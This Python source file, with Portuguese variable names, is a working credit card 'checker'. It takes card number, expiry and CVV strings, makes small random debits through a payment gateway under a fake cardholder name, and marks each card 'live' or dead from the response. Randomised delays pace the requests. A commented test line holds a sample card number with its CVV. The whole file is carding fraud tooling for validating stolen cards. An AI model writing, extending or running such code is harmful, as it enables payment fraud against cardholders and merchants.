import sys
sys.path.insert(1, '././')

from defs import arq
from defs import ca

import requests, random, json, time, base64
from requests.structures import CaseInsensitiveDict



def auth():
    dados = arq.ler_json(ca.config)['checker']['Rtzinmaker']
    
        
    return {
        "login": dados['kaue'],
        "senha": dados['1122'],
        "token": dados['token']
    }

def debito(cc):
    config_auth = f'{auth()["login"]}:{auth()["senha"]}'
    
    token2 = str(base64.b64encode(config_auth.encode())).replace("b'", '').replace("'", '')
    
    if len(cc.split("|")) == 4:
        url = "https://zeoncentral.shop/"

        debitar = random.randint(100, 200)

        numero, mes, ano, cvv = cc.split('|')
        
        if len(ano) == 2:
            ano = '20'+ano

        try:
            headers = CaseInsensitiveDict()
            headers["authorization"] = f"Basic {token2}"
            headers["Content-Type"] = "application/json"
            reference = str(random.randint(1111111, 9999999))

            data = f'"Capture":true,"Kind":"credit","Reference":"{reference}","Amount":"{debitar}","Installments":1,"CardHolderName":"joao da silva","CardNumber":"{numero}","ExpirationMonth":"{mes}","ExpirationYear":"{ano}","SecurityCode":"{cvv}","Subscription":false'

            resp = requests.post(url, headers=headers, data='{'+data+'}').text

            load = json.loads(resp)
            retorno = load['returnMessage']
            code = load['returnCode']
            
            if code == '00':
                result = True
            else:
                result = False
            
            debitar = str(debitar)
            preco = f'R${debitar[0]},{debitar[1]}{debitar[2]}'
            retorno = retorno
            
            delay = random.randint(6,10)
            
            time.sleep(delay)

            if 'Invalid parameter format' in retorno:
                return {
                    "status": False,
                    "live": False,
                    "message": f'{retorno} - Code: {code} - {preco}'
                }
                
            if 'Unsuccessful. Please, contact Rede.' in retorno:
                return {
                    "status": False,
                    "live": False,
                    "message": f'{retorno} - Code: {code} - {preco}'
                }
                
            if "Success" in retorno:
                return {
                    "status": True,
                    "live": True,
                    "message": f'{retorno} - Code: {code} - {preco}'
                }
        
            else:
                return {
                    "status": True,
                    "live": False,
                    "message": f'{retorno} - Code: {code} - {preco}'
                }
            

        except:
            return {
                    "status": False,
                    "live": False,
                    "message": 'Request inválido ao Gateway'
                }

    else:
        return {
                    "status": False,
                    "live": False,
                    "message": 'CC inválda'
                }

#print(debito('5337288379094752|05|2024|572'))

#(False, 'Unauthorized. Please try again. - Code: 103 - R$1,75')
#(True, 'Success. - Code: 00 - R$1,89')

